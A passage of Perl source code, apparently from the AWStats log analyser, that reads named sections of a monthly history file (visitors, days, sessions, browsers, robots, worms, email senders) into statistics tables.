				if ($Debug) { debug(" Begin of ORIGIN section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'origin'} ) {
							if ( $field[0] eq 'From0' ) {
								$_from_p[0] += $field[1];
								$_from_h[0] += $field[2];
							}
							elsif ( $field[0] eq 'From1' ) {
								$_from_p[1] += $field[1];
								$_from_h[1] += $field[2];
							}
							elsif ( $field[0] eq 'From2' ) {
								$_from_p[2] += $field[1];
								$_from_h[2] += $field[2];
							}
							elsif ( $field[0] eq 'From3' ) {
								$_from_p[3] += $field[1];
								$_from_h[3] += $field[2];
							}
							elsif ( $field[0] eq 'From4' ) {
								$_from_p[4] += $field[1];
								$_from_h[4] += $field[2];
							}
							elsif ( $field[0] eq 'From5' ) {
								$_from_p[5] += $field[1];
								$_from_h[5] += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_ORIGIN'
					  || $field[0] eq "${xmleb}END_ORIGIN"
					  || !$_ );
				if (   $field[0] ne 'END_ORIGIN'
					&& $field[0] ne "${xmleb}END_ORIGIN" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section ORIGIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of ORIGIN section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'origin'};
				if ( $SectionsToSave{'origin'} ) {
					Save_History( 'origin', $year, $month, $date );
					delete $SectionsToSave{'origin'};
					if ($withpurge) { @_from_p = (); @_from_h = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_DAY
			if ( $field[0] eq 'BEGIN_DAY' ) {
				if ($Debug) { debug(" Begin of DAY section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'day'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$DayPages{ $field[0] } += int( $field[1] );
							}
							$DayHits{ $field[0] } +=
							  int( $field[2] )
							  ; # DayHits always load (should be >0 and if not it's a day YYYYMM00 resulting of an old file migration)
							if ( $field[3] ) {
								$DayBytes{ $field[0] } += int( $field[3] );
							}
							if ( $field[4] ) {
								$DayVisits{ $field[0] } += int( $field[4] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_DAY'
					  || $field[0] eq "${xmleb}END_DAY"
					  || !$_ );
				if ( $field[0] ne 'END_DAY' && $field[0] ne "${xmleb}END_DAY" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section DAY not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of DAY section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'day'};

# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
#if ($SectionsToSave{'day'}) {	# Must be made after read of visitor
#	Save_History('day',$year,$month,$date); delete $SectionsToSave{'day'};
#	if ($withpurge) { %DayPages=(); %DayHits=(); %DayBytes=(); %DayVisits=(); }
#}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_VISITOR
			if ( $field[0] eq 'BEGIN_VISITOR' ) {
				if ($Debug) { debug(" Begin of VISITOR section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;

						# For backward compatibility
						if ($readvisitorforbackward) {
							if ( $field[1] ) {
								$MonthUnique{ $year . $month }++;
							}
							if ( $MonthRequired ne 'all' ) {
								if (   $field[0] !~ /^\d+\.\d+\.\d+\.\d+$/
									&& $field[0] !~ /^[0-9A-F]*:/i )
								{
									$MonthHostsKnown{ $year . $month }++;
								}
								else { $MonthHostsUnknown{ $year . $month }++; }
							}
						}

						# Process data saved in 'wait' arrays
						if ( $withupdate && $_waithost_e{ $field[0] } ) {
							my $timehostl = int( $field[4] || 0 );
							my $timehosts = int( $field[5] || 0 );
							my $newtimehosts = (
								  $_waithost_s{ $field[0] }
								? $_waithost_s{ $field[0] }
								: $_host_s{ $field[0] }
							);
							my $newtimehostl = (
								  $_waithost_l{ $field[0] }
								? $_waithost_l{ $field[0] }
								: $_host_l{ $field[0] }
							);
							if ( $newtimehosts > $timehostl + $VISITTIMEOUT ) {
								if ($Debug) {
									debug(
" Visit for $field[0] in 'wait' arrays is a new visit different than last in history",
										4
									);
								}
								if ( $field[6] ) { $_url_x{ $field[6] }++; }
								$_url_e{ $_waithost_e{ $field[0] } }++;
								$newtimehosts =~ /^(\d\d\d\d\d\d\d\d)/;
								$DayVisits{$1}++;
								if ( $timehosts && $timehostl ) {
									$_session{
										GetSessionRange( $timehosts,
											$timehostl )
									  }++;
								}
								if ( $_waithost_s{ $field[0] } ) {

	   # First session found in log was followed by another one so it's finished
									$_session{
										GetSessionRange( $newtimehosts,
											$newtimehostl )
									  }++;
								}

					 # Here $_host_l $_host_s and $_host_u are correctly defined
							}
							else {
								if ($Debug) {
									debug(
" Visit for $field[0] in 'wait' arrays is following of last visit in history",
										4
									);
								}
								if ( $_waithost_s{ $field[0] } ) {

	   # First session found in log was followed by another one so it's finished
									$_session{
										GetSessionRange(
											MinimumButNoZero(
												$timehosts, $newtimehosts
											),
											$timehostl > $newtimehostl
											? $timehostl
											: $newtimehostl
										)
									  }++;

					 # Here $_host_l $_host_s and $_host_u are correctly defined
								}
								else {

									# We correct $_host_l $_host_s and $_host_u
									if ( $timehostl > $newtimehostl ) {
										$_host_l{ $field[0] } = $timehostl;
										$_host_u{ $field[0] } = $field[6];
									}
									if ( $timehosts < $newtimehosts ) {
										$_host_s{ $field[0] } = $timehosts;
									}
								}
							}
							delete $_waithost_e{ $field[0] };
							delete $_waithost_l{ $field[0] };
							delete $_waithost_s{ $field[0] };
							delete $_waithost_u{ $field[0] };
						}

						# Load records
						if (   $readvisitorforbackward != 2
							&& $SectionsToLoad{'visitor'} )
						{    # if readvisitorforbackward==2 we do not load
							my $loadrecord = 0;
							if ($withupdate) {
								$loadrecord = 1;
							}
							else {
								if (   $HTMLOutput{'allhosts'}
									|| $HTMLOutput{'lasthosts'} )
								{
									if (
										(
											!$FilterIn{'host'}
											|| $field[0] =~ /$FilterIn{'host'}/i
										)
										&& ( !$FilterEx{'host'}
											|| $field[0] !~
											/$FilterEx{'host'}/i )
									  )
									{
										$loadrecord = 1;
									}
								}
								elsif ($MonthRequired eq 'all'
									|| $field[2] >= $MinHit{'Host'} )
								{
									if (
										$HTMLOutput{'unknownip'}
										&& ( $field[0] =~ /^\d+\.\d+\.\d+\.\d+$/
											|| $field[0] =~ /^[0-9A-F]*:/i )
									  )
									{
										$loadrecord = 1;
									}
									elsif (
										$HTMLOutput{'main'}
										&& (   $MonthRequired eq 'all'
											|| $countloaded <
											$MaxNbOf{'HostsShown'} )
									  )
									{
										$loadrecord = 1;
									}
								}
							}
							if ($loadrecord) {
								if ( $field[1] ) {
									$_host_p{ $field[0] } += $field[1];
								}
								if ( $field[2] ) {
									$_host_h{ $field[0] } += $field[2];
								}
								if ( $field[3] ) {
									$_host_k{ $field[0] } += $field[3];
								}
								if ( $field[4] && !$_host_l{ $field[0] } )
								{ # We save last connexion params if not previously defined
									$_host_l{ $field[0] } = int( $field[4] );
									if ($withupdate)
									{ # field[5] field[6] are used only for update
										if ( $field[5]
											&& !$_host_s{ $field[0] } )
										{
											$_host_s{ $field[0] } =
											  int( $field[5] );
										}
										if ( $field[6]
											&& !$_host_u{ $field[0] } )
										{
											$_host_u{ $field[0] } = $field[6];
										}
									}
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_VISITOR'
					  || $field[0] eq "${xmleb}END_VISITOR"
					  || !$_ );
				if (   $field[0] ne 'END_VISITOR'
					&& $field[0] ne "${xmleb}END_VISITOR" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section VISITOR not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of VISITOR section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'visitor'};

# WE DO NOT SAVE SECTION NOW TO BE SURE TO HAVE THIS LARGE SECTION NOT AT THE BEGINNING OF FILE
#if ($SectionsToSave{'visitor'}) {
#	Save_History('visitor',$year,$month,$date); delete $SectionsToSave{'visitor'};
#	if ($withpurge) { %_host_p=(); %_host_h=(); %_host_k=(); %_host_l=(); %_host_s=(); %_host_u=(); }
#}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_UNKNOWNIP for backward compatibility
			if ( $field[0] eq 'BEGIN_UNKNOWNIP' ) {
				my %iptomigrate = ();
				if ($Debug) { debug(" Begin of UNKNOWNIP section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'unknownip'} ) {
							$iptomigrate{ $field[0] } = $field[1] || 0;
							$countloaded++;
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_UNKNOWNIP'
					  || $field[0] eq "${xmleb}END_UNKNOWNIP"
					  || !$_ );
				if (   $field[0] ne 'END_UNKNOWNIP'
					&& $field[0] ne "${xmleb}END_UNKNOWNIP" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section UNKOWNIP not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of UNKOWNIP section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'visitor'};

# THIS SECTION IS NEVER SAVED. ONLY READ FOR MIGRATE AND CONVERTED INTO VISITOR SECTION
				foreach ( keys %iptomigrate ) {
					$_host_p{$_} += int( $_host_p{'Unknown'} / $countloaded );
					$_host_h{$_} += int( $_host_h{'Unknown'} / $countloaded );
					$_host_k{$_} += int( $_host_k{'Unknown'} / $countloaded );
					if ( $iptomigrate{$_} > 0 ) {
						$_host_l{$_} = $iptomigrate{$_};
					}
				}
				delete $_host_p{'Unknown'};
				delete $_host_h{'Unknown'};
				delete $_host_k{'Unknown'};
				delete $_host_l{'Unknown'};
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_LOGIN
			if ( $field[0] eq 'BEGIN_LOGIN' ) {
				if ($Debug) { debug(" Begin of LOGIN section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'login'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_login_p{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_login_h{ $field[0] } += $field[2];
							}
							if ( $field[3] ) {
								$_login_k{ $field[0] } += $field[3];
							}
							if ( !$_login_l{ $field[0] } && $field[4] ) {
								$_login_l{ $field[0] } = int( $field[4] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_LOGIN'
					  || $field[0] eq "${xmleb}END_LOGIN"
					  || !$_ );
				if (   $field[0] ne 'END_LOGIN'
					&& $field[0] ne "${xmleb}END_LOGIN" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section LOGIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of LOGIN section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'login'};
				if ( $SectionsToSave{'login'} ) {
					Save_History( 'login', $year, $month, $date );
					delete $SectionsToSave{'login'};
					if ($withpurge) {
						%_login_p = ();
						%_login_h = ();
						%_login_k = ();
						%_login_l = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_DOMAIN
			if ( $field[0] eq 'BEGIN_DOMAIN' ) {
				if ($Debug) { debug(" Begin of DOMAIN section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'domain'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_domener_p{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_domener_h{ $field[0] } += $field[2];
							}
							if ( $field[3] ) {
								$_domener_k{ $field[0] } += $field[3];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_DOMAIN'
					  || $field[0] eq "${xmleb}END_DOMAIN"
					  || !$_ );
				if (   $field[0] ne 'END_DOMAIN'
					&& $field[0] ne "${xmleb}END_DOMAIN" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section DOMAIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of DOMAIN section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'domain'};
				if ( $SectionsToSave{'domain'} ) {
					Save_History( 'domain', $year, $month, $date );
					delete $SectionsToSave{'domain'};
					if ($withpurge) {
						%_domener_p = ();
						%_domener_h = ();
						%_domener_k = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SESSION
			if ( $field[0] eq 'BEGIN_SESSION' ) {
				if ($Debug) { debug(" Begin of SESSION section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'session'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_session{ $field[0] } += $field[1];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SESSION'
					  || $field[0] eq "${xmleb}END_SESSION"
					  || !$_ );
				if (   $field[0] ne 'END_SESSION'
					&& $field[0] ne "${xmleb}END_SESSION" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section SESSION not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of SESSION section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'session'};

# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
#if ($SectionsToSave{'session'}) {
#	Save_History('session',$year,$month,$date); delete $SectionsToSave{'session'}; }
#	if ($withpurge) { %_session=(); }
#}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_OS
			if ( $field[0] eq 'BEGIN_OS' ) {
				if ($Debug) { debug(" Begin of OS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'os'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_os_h{ $field[0] } += $field[1];
								$_os_p{ $field[0] } += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_OS'
					  || $field[0] eq "${xmleb}END_OS"
					  || !$_ );
				if ( $field[0] ne 'END_OS' && $field[0] ne "${xmleb}END_OS" ) {
					error(
"History file \"$filetoread\" is corrupted (End of section OS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of OS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'os'};
				if ( $SectionsToSave{'os'} ) {
					Save_History( 'os', $year, $month, $date );
					delete $SectionsToSave{'os'};
					if ($withpurge) { %_os_h = (); %_os_p = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_BROWSER
			if ( $field[0] eq 'BEGIN_BROWSER' ) {
				if ($Debug) { debug(" Begin of BROWSER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'browser'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_browser_h{ $field[0] } += $field[1];
								$_browser_p{ $field[0] } += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_BROWSER'
					  || $field[0] eq "${xmleb}END_BROWSER"
					  || !$_ );
				if (   $field[0] ne 'END_BROWSER'
					&& $field[0] ne "${xmleb}END_BROWSER" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section BROWSER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of BROWSER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'browser'};
				if ( $SectionsToSave{'browser'} ) {
					Save_History( 'browser', $year, $month, $date );
					delete $SectionsToSave{'browser'};
					if ($withpurge) { %_browser_h = (); %_browser_p = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_UNKNOWNREFERER
			if ( $field[0] eq 'BEGIN_UNKNOWNREFERER' ) {
				if ($Debug) { debug(" Begin of UNKNOWNREFERER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'unknownreferer'} ) {
							$countloaded++;
							if ( !$_unknownreferer_l{ $field[0] } ) {
								$_unknownreferer_l{ $field[0] } =
								  int( $field[1] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_UNKNOWNREFERER'
					  || $field[0] eq "${xmleb}END_UNKNOWNREFERER"
					  || !$_ );
				if (   $field[0] ne 'END_UNKNOWNREFERER'
					&& $field[0] ne "${xmleb}END_UNKNOWNREFERER" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section UNKNOWNREFERER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of UNKNOWNREFERER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'unknownreferer'};
				if ( $SectionsToSave{'unknownreferer'} ) {
					Save_History( 'unknownreferer', $year, $month, $date );
					delete $SectionsToSave{'unknownreferer'};
					if ($withpurge) { %_unknownreferer_l = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_UNKNOWNREFERERBROWSER
			if ( $field[0] eq 'BEGIN_UNKNOWNREFERERBROWSER' ) {
				if ($Debug) {
					debug(" Begin of UNKNOWNREFERERBROWSER section");
				}
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'unknownrefererbrowser'} ) {
							$countloaded++;
							if ( !$_unknownrefererbrowser_l{ $field[0] } ) {
								$_unknownrefererbrowser_l{ $field[0] } =
								  int( $field[1] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_UNKNOWNREFERERBROWSER'
					  || $field[0] eq "${xmleb}END_UNKNOWNREFERERBROWSER"
					  || !$_ );
				if (   $field[0] ne 'END_UNKNOWNREFERERBROWSER'
					&& $field[0] ne "${xmleb}END_UNKNOWNREFERERBROWSER" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section UNKNOWNREFERERBROWSER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of UNKNOWNREFERERBROWSER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'unknownrefererbrowser'};
				if ( $SectionsToSave{'unknownrefererbrowser'} ) {
					Save_History( 'unknownrefererbrowser',
						$year, $month, $date );
					delete $SectionsToSave{'unknownrefererbrowser'};
					if ($withpurge) { %_unknownrefererbrowser_l = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SCREENSIZE
			if ( $field[0] eq 'BEGIN_SCREENSIZE' ) {
				if ($Debug) { debug(" Begin of SCREENSIZE section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'screensize'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_screensize_h{ $field[0] } += $field[1];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SCREENSIZE'
					  || $field[0] eq "${xmleb}END_SCREENSIZE"
					  || !$_ );
				if (   $field[0] ne 'END_SCREENSIZE'
					&& $field[0] ne "${xmleb}END_SCREENSIZE" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section SCREENSIZE not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of SCREENSIZE section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'screensize'};
				if ( $SectionsToSave{'screensize'} ) {
					Save_History( 'screensize', $year, $month, $date );
					delete $SectionsToSave{'screensize'};
					if ($withpurge) { %_screensize_h = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_ROBOT
			if ( $field[0] eq 'BEGIN_ROBOT' ) {
				if ($Debug) { debug(" Begin of ROBOT section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'robot'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_robot_h{ $field[0] } += $field[1];
							}
							$_robot_k{ $field[0] } += $field[2];
							if ( !$_robot_l{ $field[0] } ) {
								$_robot_l{ $field[0] } = int( $field[3] );
							}
							if ( $field[4] ) {
								$_robot_r{ $field[0] } += $field[4];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_ROBOT'
					  || $field[0] eq "${xmleb}END_ROBOT"
					  || !$_ );
				if (   $field[0] ne 'END_ROBOT'
					&& $field[0] ne "${xmleb}END_ROBOT" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section ROBOT not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of ROBOT section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'robot'};
				if ( $SectionsToSave{'robot'} ) {
					Save_History( 'robot', $year, $month, $date );
					delete $SectionsToSave{'robot'};
					if ($withpurge) {
						%_robot_h = ();
						%_robot_k = ();
						%_robot_l = ();
						%_robot_r = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_WORMS
			if ( $field[0] eq 'BEGIN_WORMS' ) {
				if ($Debug) { debug(" Begin of WORMS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'worms'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_worm_h{ $field[0] } += $field[1];
							}
							$_worm_k{ $field[0] } += $field[2];
							if ( !$_worm_l{ $field[0] } ) {
								$_worm_l{ $field[0] } = int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_WORMS'
					  || $field[0] eq "${xmleb}END_WORMS"
					  || !$_ );
				if (   $field[0] ne 'END_WORMS'
					&& $field[0] ne "${xmleb}END_WORMS" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section WORMS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of WORMS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'worms'};
				if ( $SectionsToSave{'worms'} ) {
					Save_History( 'worms', $year, $month, $date );
					delete $SectionsToSave{'worms'};
					if ($withpurge) {
						%_worm_h = ();
						%_worm_k = ();
						%_worm_l = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_EMAILS
			if ( $field[0] eq 'BEGIN_EMAILSENDER' ) {
				if ($Debug) { debug(" Begin of EMAILSENDER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'emailsender'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_emails_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_emails_k{ $field[0] } += $field[2];
							}
							if ( !$_emails_l{ $field[0] } ) {
								$_emails_l{ $field[0] } = int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_EMAILSENDER'
					  || $field[0] eq "${xmleb}END_EMAILSENDER"
					  || !$_ );
				if (   $field[0] ne 'END_EMAILSENDER'
					&& $field[0] ne "${xmleb}END_EMAILSENDER" )
				{
					error(
"History file \"$filetoread\" is corrupted (End of section EMAILSENDER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug(
" End of EMAILSENDER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'emailsender'};
				if ( $SectionsToSave{'emailsender'} ) {
					Save_History( 'emailsender', $year, $month, $date );
					delete $SectionsToSave{'emailsender'};
					if ($withpurge) {
						%_emails_h = ();
						%_emails_k = ();
						%_emails_l = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_EMAILR
			if ( $field[0] eq 'BEGIN_EMAILRECEIVER' ) {
				if ($Debug) { debug(" Begin of EMAILRECEIVER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'emailreceiver'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_emailr_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_emailr_k{ $field[0] } += $field[2];
							}
							if ( !$_emailr_l{ $field[0] } ) {
								$_emailr_l{ $field[0] } = int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
